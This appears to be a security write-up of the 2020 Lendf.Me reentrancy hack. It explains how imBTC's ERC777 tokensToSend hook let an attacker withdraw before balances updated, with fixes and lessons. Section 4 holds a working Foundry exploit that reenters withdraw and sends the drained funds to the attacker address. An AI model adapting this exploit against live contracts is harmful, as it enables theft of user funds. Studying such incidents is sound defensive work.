# Lendf.Me — ERC777 Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2020-04-18 |
| **Protocol** | Lendf.Me (dForce) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$25,000,000 (imBTC, ETH, and multiple other assets) |
| **Attacker** | [0xA9BF70A420d364e923C74448D9D817d3F2A77822](https://etherscan.io/address/0xA9BF70A420d364e923C74448D9D817d3F2A77822) |
| **Attack Tx** | [0xae7d664b...](https://etherscan.io/tx/0xae7d664bdfcc54220df4f18d339005c6faf6e62c9ca79c56387bc0389274363b) |
| **Vulnerable Contract** | [0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea](https://etherscan.io/address/0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea) |
| **Root Cause** | Reentrancy via ERC777 token's `tokensToSend` hook allows withdrawal before balance update |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2020-04/LendfMe_exp.sol) |

---
## 1. Vulnerability Overview

Lendf.Me is a lending protocol forked from Compound that accepted imBTC — an ERC777-compliant token — as collateral. ERC777 is backward-compatible with ERC20, but additionally provides hooks (`tokensToSend`, `tokensReceived`) that are invoked on the sender/receiver during token transfers. Lendf.Me did not follow the Checks-Effects-Interactions pattern, which allowed external callbacks triggered during token transfers to reenter the contract **before** its state was updated.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable withdraw logic (pseudocode)
function withdraw(address asset, uint256 requestedAmount) external returns (uint256) {
    uint256 balance = accountBalance[msg.sender][asset];

    // ❌ Problem: token transfer occurs before balance update
    // ERC777 transfer → tokensToSend hook called → reentrancy possible
    require(IERC20(asset).transfer(msg.sender, requestedAmount));

    // ❌ Balance deduction happens after transfer (original balance still intact during reentry)
    accountBalance[msg.sender][asset] = balance - requestedAmount;
}

// ✅ Correct pattern (Checks-Effects-Interactions)
function withdraw(address asset, uint256 requestedAmount) external returns (uint256) {
    uint256 balance = accountBalance[msg.sender][asset];
    require(balance >= requestedAmount, "insufficient balance");

    // ✅ Update state first (Effects)
    accountBalance[msg.sender][asset] = balance - requestedAmount;

    // ✅ External call after (Interactions)
    require(IERC20(asset).transfer(msg.sender, requestedAmount));
}
```

---
### On-Chain Source Code

Source: Sourcify verified


**MoneyMarket.sol** — Entry point:
```solidity
// ❌ Root cause: Reentrancy via ERC777 token's `tokensToSend` hook allows withdrawal before balance update
    function repayBorrow(address asset, uint amount) public returns (uint) {
        if (paused) {
            return fail(Error.CONTRACT_PAUSED, FailureInfo.REPAY_BORROW_CONTRACT_PAUSED);
        }
        PayBorrowLocalVars memory localResults;
        Market storage market = markets[asset];
        Balance storage borrowBalance = borrowBalances[msg.sender][asset];
        Error err;
        uint rateCalculationResultCode;

        // We calculate the newBorrowIndex, user's borrowCurrent and borrowUpdated for the asset
        (err, localResults.newBorrowIndex) = calculateInterestIndex(market.borrowIndex, market.borrowRateMantissa, market.blockNumber, getBlockNumber());
        if (err != Error.NO_ERROR) {
            return fail(err, FailureInfo.REPAY_BORROW_NEW_BORROW_INDEX_CALCULATION_FAILED);
        }

        (err, localResults.userBorrowCurrent) = calculateBalance(borrowBalance.principal, borrowBalance.interestIndex, localResults.newBorrowIndex);
        if (err != Error.NO_ERROR) {
            return fail(err, FailureInfo.REPAY_BORROW_ACCUMULATED_BALANCE_CALCULATION_FAILED);
        }
    // ... (truncated)

        // We need to calculate what the updated cash will be after we transfer in from user
        localResults.currentCash = getCash(asset);

        (err, localResults.updatedCash) = add(localResults.currentCash, localResults.repayAmount);
        if (err != Error.NO_ERROR) {
            return fail(err, FailureInfo.REPAY_BORROW_NEW_TOTAL_CASH_CALCULATION_FAILED);
        }

        // The utilization rate has changed! We calculate a new supply index and borrow index for the asset, and save it.

        // We calculate the newSupplyIndex, but we have newBorrowIndex already
        (err, localResults.newSupplyIndex) = calculateInterestIndex(market.supplyIndex, market.supplyRateMantissa, market.blockNumber, getBlockNumber());
        if (err != Error.NO_ERROR) {
            return fail(err, FailureInfo.REPAY_BORROW_NEW_SUPPLY_INDEX_CALCULATION_FAILED);
        }

        (rateCalculationResultCode, localResults.newSupplyRateMantissa) = market.interestRateModel.getSupplyRate(asset, localResults.updatedCash, localResults.newTotalBorrows);
        if (rateCalculationResultCode != 0) {
            return failOpaque(FailureInfo.REPAY_BORROW_NEW_SUPPLY_RATE_CALCULATION_FAILED, rateCalculationResultCode);
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker Contract
    │
    ├─[1] Register tokensToSend hook with ERC1820
    │       erc1820.setInterfaceImplementer(this, TOKENS_SENDER_HASH, this)
    │
    ├─[2] supply(imBTC, balance - 1)   → normal deposit
    │
    ├─[3] supply(imBTC, 1)             → deposit 1 satoshi
    │       └─ imBTC transfer occurs
    │           └─ ERC777: tokensToSend hook invoked ────────────────┐
    │                                                                 │
    ├─[4] withdraw(imBTC, MAX)  ◄── Reentry! Balance not yet updated │
    │       └─ Successfully withdraws all protocol imBTC             │
    │                                                                 │
    │       ◄─────────────────────────────────────────────────────────┘
    │
    └─[5] Transfer stolen imBTC to attacker address
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface IMoneyMarket {
    function supply(address asset, uint256 amount) external returns (uint256);
    function withdraw(address asset, uint256 requestedAmount) external returns (uint256);
}

contract LendfMeExploit is Test {
    address victim = 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea;  // Lendf.Me contract
    address attacker = 0xA9BF70A420d364e923C74448D9D817d3F2A77822;
    IERC20 imBTC = IERC20(0x3212b29E33587A00FB1C83346f5dBFA69A458923);  // ERC777 token
    IERC1820Registry internal erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    bytes32 internal constant TOKENS_SENDER_INTERFACE_HASH =
        0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;

    function setUp() public {
        cheats.createSelectFork("mainnet", 9_899_725);
    }

    // ERC777 hook: automatically called on imBTC transfer
    function tokensToSend(
        address, address, address,
        uint256 amount,
        bytes calldata, bytes calldata
    ) external {
        if (amount == 1) {
            // ⚡ Reentry point: withdraw everything while balance has not yet been updated
            IMoneyMarket(victim).withdraw(address(imBTC), type(uint256).max);
        }
    }

    function testExploit() public {
        // [Setup] Set unlimited approval and register ERC777 hook
        imBTC.approve(victim, type(uint256).max);
        erc1820.setInterfaceImplementer(address(this), TOKENS_SENDER_INTERFACE_HASH, address(this));

        // [Setup] Move imBTC from attacker
        cheats.startPrank(attacker);
        imBTC.transfer(address(this), imBTC.balanceOf(attacker));
        cheats.stopPrank();

        uint256 this_balance = imBTC.balanceOf(address(this));
        uint256 victim_balance = imBTC.balanceOf(victim);

        // Adjust if attacker balance exceeds victim balance
        if (this_balance > (victim_balance + 1)) {
            this_balance = victim_balance + 1;
        }

        // [Attack Step 1] Deposit most of balance
        IMoneyMarket(victim).supply(address(imBTC), this_balance - 1);

        // [Attack Step 2] Deposit 1 satoshi → ERC777 hook → reentry → full withdrawal
        IMoneyMarket(victim).supply(address(imBTC), 1);

        // [Attack Step 3] Withdraw remaining balance
        IMoneyMarket(victim).withdraw(address(imBTC), type(uint256).max);

        // Transfer stolen assets to attacker EOA
        IERC20(imBTC).transfer(attacker, IERC20(imBTC).balanceOf(address(this)));
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reentrancy Attack |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **OWASP DeFi** | State manipulation via external callback |
| **Attack Vector** | ERC777 `tokensToSend` hook |
| **Precondition** | Lending protocol that accepts ERC777-compatible tokens as collateral |
| **Impact** | Full protocol liquidity drain |

---
## 6. Remediation Recommendations

1. **Apply Checks-Effects-Interactions Pattern**: State variables must be updated before any external call.
2. **Use Reentrancy Guard**: Apply OpenZeppelin `ReentrancyGuard`'s `nonReentrant` modifier to all critical functions.
3. **Exercise Special Care with ERC777 Tokens**: ERC777 triggers external callbacks on transfer and must be treated differently from standard ERC20.
4. **Audit Token Compatibility**: Before adding a new token as collateral, review its standard compliance and potential hook-based vulnerabilities.

---
## 7. Lessons Learned

- **Dangers of ERC777**: ERC777 offers powerful features, but its callback mechanism introduces unexpected reentrancy vulnerabilities in protocols that assume standard ERC20 behavior. Uniswap V1 was attacked by the same vulnerability on the same day.
- **Side Effects of Standard Extensions**: When adding new features (hooks, callbacks) to a token standard, compatibility issues with existing infrastructure must be carefully examined.
- **Caution When Forking**: Even when forking a battle-tested protocol like Compound, interactions with new token types must be audited independently.
- **$25M Loss**: One of the largest DeFi hacks in history at the time, it underscored the critical importance of smart contract security audits.